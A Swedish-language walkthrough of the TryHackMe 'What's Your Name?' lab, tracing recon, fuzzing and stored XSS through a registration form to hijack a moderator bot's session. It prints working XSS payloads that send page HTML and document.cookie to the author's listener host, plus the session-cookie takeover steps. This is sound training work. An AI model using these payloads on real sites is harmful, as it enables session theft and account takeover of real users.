# What's Your Name?

![Screenshot](img/Pasted%20image%2020260501201142.png)

https://tryhackme.com/room/whatsyourname

![Screenshot](img/Pasted%20image%2020260501201201.png)

## Recon

Jag antar att jag bara behöver jobba med webbsidan, som antagligen ligger på port 80, men lika bra att scanna alla portar ändå.

Hittar port 80 och 22 öppna som förväntat, men även 8081 - vad döljer sig där?

Nmap säger följande:

![Screenshot](img/Pasted%20image%2020260501202342.png)

![Screenshot](img/Pasted%20image%2020260501202441.png)

Så också nåt webbigt. Dags att öppna webbläsaren.
## Webben

På port 80 presenteras en "helt ny era social networking". Oj oj oj.

![Screenshot](img/Pasted%20image%2020260501202604.png)

Man har även chans att registrera sig:

![Screenshot](img/Pasted%20image%2020260501202640.png)

Om jag försöker peka till samma domän fast på port 8081 kommer jag inte fram.

Vad säger curl om jag kör mot IP:t och port 8081?

![Screenshot](img/Pasted%20image%2020260501202916.png)

Ah, endast en kommentar. Det var därför jag inte såg nåt... Blir ju nyfiken på hur `login.php` faktiskt ser ut. Återkommer nog till det. 

Dags att regga ett konto!
## Registrering

![Screenshot](img/Pasted%20image%2020260501203213.png)

Efter att ha klickat på *Register* redirectades jag hit:

![Screenshot](img/Pasted%20image%2020260501203307.png)

Märkligt - en inloggningssida som säger att jag behöver besöka en annan inloggningssida?

Om jag försöker logga in där jag står får jag följande:

![Screenshot](img/Pasted%20image%2020260501203349.png)

Besöker `login.worldwap.thm` då...

Funkar inte riktigt. Lägger till subdomänen i `/etc/hosts` och då verkar det lira. Ser ut som att jag kommer till sajten på port 8081. Är min användare verifierad nu?

Nope, samma meddelande vid den första inloggningssidan. Hm.

En liten fuzzing är nog på sin plats...
## Fuzz fuzz

Hittade en massa grejs, bland annat att directory listing var aktiverat på `/public/`

![Screenshot](img/Pasted%20image%2020260501204403.png)

`html/` innehåller bara index (för jag landar på förstasidan när jag klickar in mig där), men `js/` innehåller lite gött. Bland annat `login.js` 

![Screenshot](img/Pasted%20image%2020260501204701.png)

Utan att ha analyserat koden supernoga ser det ju ut som att man kan redirectas till en dashboard eller adminpanel baserat på värdet av `data.role`. Jag ser ju även sökvägen till login-API:et som finns under `/api/login.php`. 

Just `/api` såg jag i min fuzz

![Screenshot](img/Pasted%20image%2020260501205422.png)

Men troligtvis kan jag inte öppna sökvägen och se vad som ligger där. Exakt, det lirar inte att göra en GET dit

![Screenshot](img/Pasted%20image%2020260501205548.png)

Använder curl för att försöka logga in. Funkade inte med `admin:admin` så jag får testa med creds från min nya användare:

![Screenshot](img/Pasted%20image%2020260501210052.png)

Men får ändå `{"error":"User not verified."}` till svar...

Dags att inspektera grejer i Burp.
## Burp

Exakt hur ser POST requesten ut när jag registrerade min användare?

![Screenshot](img/Pasted%20image%2020260501210614.png)

Och responsen

![Screenshot](img/Pasted%20image%2020260501210633.png)

Så inga dolda fält om verified-status...

POST requesten har ju en intressant header, `X-THM-API-Key`

Ser ut som en md5-hash, och en snabb vända till crackstation gav svaret:

![Screenshot](img/Pasted%20image%2020260501211431.png)

`johncena` - en användare kanske?

## API

Jag tänker att min bästa öppning just nu är att det finns ett API och att jag har en API-nyckel. Eventuellt att anrop dit kan ge mig mer info om hur jag faktiskt tar mig in. Gjorde en riktad fuzz till just `/api` med `.php` som ändelse med ffuf och fick följande svar:

![Screenshot](img/Pasted%20image%2020260501211628.png)

Dags att kötta lite med curl mot dessa endpoints och inkludera API-nyckeln med varje anrop. Börjar med config, setup och mod :)

`Config` svarade tomt.

`Mod` svarade med "Not logged in"

Samma sak med `posts`.

`Setup` svarade med "Setup successful". Vad tusan innebär det? :D

Märker dock en lite intressant grej. När jag registrerat en användare och kör en POST request med curl mot `/api/login.php` så får jag till svar "user not verified". Kör jag sedan ett request till `api/setup.php` och ett nytt request för att försöka logga in så får jag "Invalid username or password". På nåt sätt så verkar ju `api/setup.php` rensa bort mina skapade användare.

Kolla här:

![Screenshot](img/Pasted%20image%2020260501234739.png)

![Screenshot](img/Pasted%20image%2020260501234802.png)

![Screenshot](img/Pasted%20image%2020260501234818.png)

![Screenshot](img/Pasted%20image%2020260501234829.png)
## Enumerera användare

Det finns bevisligen redan en användare med namnet `admin`. Det gick nämligen inte att regga igen.

![Screenshot](img/Pasted%20image%2020260501212757.png)

Försökte med `moderator`, och det fick jag registrera.

How about `johncena`? Det fick jag också registrera.

## Vad tog modulen upp?

Modulen handlar om Advanced Client-Side Attacks. Det senaste jag läste och labbade med handlade om CORS och Same-Origin Policy.

Fångar därför GET requestet till `login.worldwap.thm` i Burp, skickar till Repeater och försöker lägga till en Origin header. Börjar med `null`

![Screenshot](img/Pasted%20image%2020260502000529.png)

Får dock samma svar. Testar även med `Origin: login.worldwap.thm` och `worldwap.thm` men resulterar i samma.

Granskar istället POST requesten som skickas till `/api/login.php` när man är på sidan `/public/html/login.php`

![Screenshot](img/Pasted%20image%2020260502103519.png)

Kanske att man kan göra något med headers Origin och/eller Referer här?

Testar lite olika grejer men är fast i samma loop av att inte lyckas verifiera användaren...
## Fuzz mot login.worldwap.thm

Kanske finns några spännande endpoints på subdomänen?

![Screenshot](img/Pasted%20image%2020260502110135.png)

Lite bilder som ser ut som typiskt content för en social plattform. Men annars var det inte mycket mer än så. Inget jag ser att jag kan dra direkt nytta av.

Tror visserligen att det måste ha nåt med CORS och Same-Origin Policy att göra. Men hur...
## Breakthrough?

Det här med fuzzing alltså, varför har jag inte sett den här endpointen tidigare?

![Screenshot](img/Pasted%20image%2020260502113914.png)

Får dock det här när jag uppger `hello:hello`

![Screenshot](img/Pasted%20image%2020260502114200.png)

Körde en ny fuzz och hittade ju verkligen nåt mer intressant på `login.worldwap.thm`

![Screenshot](img/Pasted%20image%2020260502114827.png)

## XSS Payload vid registrering

Jag verkar inte hitta ett sätt för att verifiera mig. När jag läser mer noga vid registrerings-forumläret så står det att en moderator kommer att granska min registrering - kanske är det den som manuellt markerar mig som verified?

![Screenshot](img/Pasted%20image%2020260502151347.png)

Testar därför att sätta upp en lyssnare och skicka en XSS payload vid registreringen.


![Screenshot](img/Pasted%20image%2020260502151237.png)

Jag väljer att lägga det i fältet för name eftersom jag gissar att det skrivs ut i DOM:en.

Återvänder till min lyssnare och ser följande:

![Screenshot](img/Pasted%20image%2020260502151451.png)

Bingo! Hur ser detta ut om jag decodar från HTML?

```html
GET /probe?html=<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">WorldWAP</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                                        <li class="nav-item">
                        <a class="nav-link" href="dashboard.php">Dashboard</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="logout.php">Logout</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
    <h2 class="text-center">Manage Users</h2>
    <!-- <div id="users" class="mt-5"></div> -->

    <div id="users2" class="mt-5">
        <table class="table">
            <thead>
            <tr>
                <th>Username</th>
                <th>Email</th>
                <th>Name</th>
                <th>Action</th>
            </tr>
            </thead>
            <tbody>
                        <tr>
                <td>hej</td>
                <td>hej</td>
                <td>hej</td>
                <td>
                <a href="../../../api/mod_update.php?userId=34">Activate</a>
                </td>
            </tr>
                        <tr>
                <td>max</td>
                <td>max</td>
                <td><img src="x" onerror="fetch('http://192.168.147.205:4444/probe?html='+encodeURIComponent(document.body.outerHTML.slice(0,4000)))"></td>
                <td>
                <a href="../../../api/mod_update.php?userId=35">Activate</a>
                </td>
            </tr>
                        </tbody>
        </table>
    </div>

    <script src="../js/slim.min.js"></script>
    <script src="../js/bootstrap.min.js"></script>

</div></body> HTTP/1.1" 404 -
```

Jag kan utläsa mitt `userId` som i det här fallet är 35 (för min nya användare `max`, 34 för min gamla `hej`). Men kontot är fortfarande inte aktiverat, så jag vill skapa en ny användare och uppdatera min payload till följande:

`<img src=x onerror="fetch(this.closest('tr').querySelector('a[href*=mod_update]').href).then(()=>fetch('http://192.168.147.205:5555/done'))">`

Byter port så jag slipper noise från min gamla payload :)

Fick följande svar:

![Screenshot](img/Pasted%20image%2020260502153045.png)

Men får fortfarande "user not verified". Men det känns nära nu!

Och nu en bit in med att provat olika payloads får jag inget svar från servern alls. Alltså till min lyssnare. Även startat om maskinen och min VPN-anslutning. Trots det kan jag inte köra min initiala payload, oavsett användare, så det känns som att jag kört fast. Dags för paus.

## Efter pausen

Insåg ganska direkt när jag hade tankat på med kaffe och frukt att det säkert var nån cache-grej i browsern som stökade till det. När jag försökte skicka iväg min payload tidigare (alltså för att bekräfta) hade maskinen bytt IP. Kanske att browsern laddade in en cachad version som pekade mot fel IP helt enkelt.

Nystart, raderat all cache och iväg med min initiala payload - det lyckades. Phew...

Men jag är fortfarande kvar i samma hjulspår, nog för idag.

## Poletten föll ner. Eller?

Efter att jag stängt ner projektet för dagen och tagit en löprunda stod jag senare i duschen. Där började jag gå igenom vad jag hade gjort och vad det fanns för möjliga vägar framåt.

Vad hade jag försökt göra? Jag har genom en XSS payload försökt få moderatorn att verifiera mitt konto. Men vad är det jag vill uppnå?

För att få första flaggan behöver jag komma åt moderator-kontot.

Eftersom jag lyckas skicka en XSS payload till den förmodade moderatorn, skulle jag då inte kunna skicka en payload som istället kapar sessionen så att jag kan ta över den?

Då borde jag ju komma åt kontot för moderator! Dags att omsätta min idé till praktik.

Detta bör funka, såvida att sajtens cookies inte har HttpOnly-flaggan satt. Jag har inte haft något sätt att kontrollera detta i inloggat läge (eftersom jag inte lyckas verifiera mina användare...), men av att bara surfa runt på sajten så är denna flagga inte satt.
## Ny payload

Den ser ut så här:

`<img src=x onerror="fetch('http://xx.xx.xx.xx:4444/?c='+encodeURIComponent(document.cookie))">`

Sparar det till en fil, startar min lyssnare och skickar en payload i namn-fältet.

![Screenshot](img/Pasted%20image%2020260503140548.png)

Tyvärr ser svaret ut så här:

![Screenshot](img/Pasted%20image%2020260503140759.png)

Kan jag ha skrivit nåt fel i min payload? Ja, det hade jag. Jag ska ju ta bort HTML-taggarna. Gör om gör rätt.

Redigerade `p.js` och inväntar nästa runda som "moderatorn" exekverar min payload, och voilà:

![Screenshot](img/Pasted%20image%2020260503141238.png)

Decodade responsen, öppnade devtools och lade in den som min egen PHPSESSID cookie, uppdaterade browsern och:

![Screenshot](img/Pasted%20image%2020260503141507.png)

Det stora misstaget under gårkvällen var nog att jag låste in mig på att min payload skulle göra så att moderatorn verifierade min användare. Lite paus och distans fick mig att tänka i andra banor.

Navigerade sen till `login.worldwap.thm/login.php` och fick både se en fräck dashboard och en flagga!

<details>
  <summary><b>Klicka här för att se flaggan</b></summary>

  ![Screenshot](img/Pasted%20image%2020260503142049.png)
</details>

## Nästa flagga

Den kommer jag att få när jag har tillgång till admin-panelen. Dags att göra lite recon här i min nya miljö för att se vad man kan hitta på. Men jag misstänker att jag på nåt sätt ska utnyttja det jag hittat i js-filen `login.js`

![Screenshot](img/Pasted%20image%2020260503142614.png)

Behöver nog sätta rollen admin till en användare först på nåt vis.

Så här ser vänstermenyn ut, no access :(

![Screenshot](img/Pasted%20image%2020260503144731.png)

Försökte ändra lösenord. Man verkar inte behöva uppge sitt gamla lösenord, men:

![Screenshot](img/Pasted%20image%2020260503145030.png)

Vad jag däremot kommer åt är en chat, och där kan jag chatta med admin, muhaha!

![Screenshot](img/Pasted%20image%2020260503145122.png)

Testade att skicka några meddelanden - boten svarar inte.

Skickade `<img src=x>` vilket renderade en trasig bild - innerHTML används så chattfunktionen är garanterat nästa attackväg.

![Screenshot](img/Pasted%20image%2020260503145955.png)

Tar en titt på js-filerna jag hittat tidigare och navigerar till `worldwap.thm/api/mod.php` och hittar användaren som jag registrerade:

![Screenshot](img/Pasted%20image%2020260503150447.png)

Nu när jag är `moderator` får jag åtkomst. Blir ju sugen på att försöka ändra status till 1 - undra om det gör mig "verified"? Sen om det gör att jag kommer närmare admin-flaggan vet jag inte riktigt.

Gick till `mod_update.php`

![Screenshot](img/Pasted%20image%2020260503150803.png)

Lade till rätt `userId`

![Screenshot](img/Pasted%20image%2020260503150835.png)

När jag gick tillbaka för att bekräfta ändringen var min användare borta, kanske betyder att jag lyckades.

![Screenshot](img/Pasted%20image%2020260503150914.png)

Testar att logga in med användaren `max` i en annan browser.

Yey!

![Screenshot](img/Pasted%20image%2020260503151038.png)

Då har jag iaf löst det mysteriet :D Men fokus på admin-flaggan nu.

Ska jag vara så fräck och testa samma trick mot admin-boten? Att den skickar sin session cookie? Värt att prova, även om jag tänker att det borde vara lite annorlunda.

Det funkar inte helt som jag tänkt, min lyssnare fångar inget.

`mod_update.php` finns ju, kan `admin_update.php` finnas? Nix...

![Screenshot](img/Pasted%20image%2020260503153346.png)

Kör följande i consolen i webbläsaren i ett försökt att ta reda på vilken roll jag har.

```js
fetch('http://worldwap.thm/api/login.php', {
  method: 'POST', 
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({username: 'max', password: 'dittlösenord'})
}).then(r=>r.json()).then(console.log)
```

Fick följande svar när jag gjorde det från `login.worldwap.thm/chat.php`

![Screenshot](img/Pasted%20image%2020260503155121.png)

På med läsglasögonen: CORS policy säger att jag inte får göra denna fetch härifrån. Navigerar till `worldwap.thm` då och försöker igen.

![Screenshot](img/Pasted%20image%2020260503155321.png)

`max` är `user`, och vad `moderator` är kan jag inte ta reda på för jag kan inte lösenordet...
## Ny fuzz

Gör en ny, större fuzz mot `/api` för det här med chatten vet jag inte riktigt... Hittar några nya endpoints:

![Screenshot](img/Pasted%20image%2020260503161851.png)

OMG! Gjorde ett curl request mot `/api/posts.php` och hittade följande guldgruva!

![Screenshot](img/Pasted%20image%2020260503161757.png)

Men va? Jag kan ju se det inlägget när jag är inloggad både som `moderator`och `max`. Jag blir snurrig. Jag har ju klart och tydligt ett screenshot när jag är inloggad som `moderator`, och där syns inte inlägget :D Det är ju nåt som boten måste ha lagt till i ett senare skede... Dags att leta.

Hm, och nu utan att veta vad jag gjorde så fick jag sista flaggan...

<details>
  <summary><b>Klicka här för att se flaggan</b></summary>

  ![Screenshot](img/Pasted%20image%2020260503163037.png)
</details>

Det enda jag gjorde var att försöka hitta rätt endpoint för `/4dm1n0p3r4t10nS` genom att skicka olika curl requests. När jag bara fick 404 på olika tänkbara på `worldwap.thm` gick jag över till `login.worldwap.thm`. Ville navigera till startsidan där för att se en tänkbar sökväg, och så var plötsligt flaggan utskriven.

Får nog ta och göra om det här rummet snart igen för att försöka reda ut logiken för hur jag "pwnade" admin :D Och kanske ta en titt i en writeup. Happy hacking!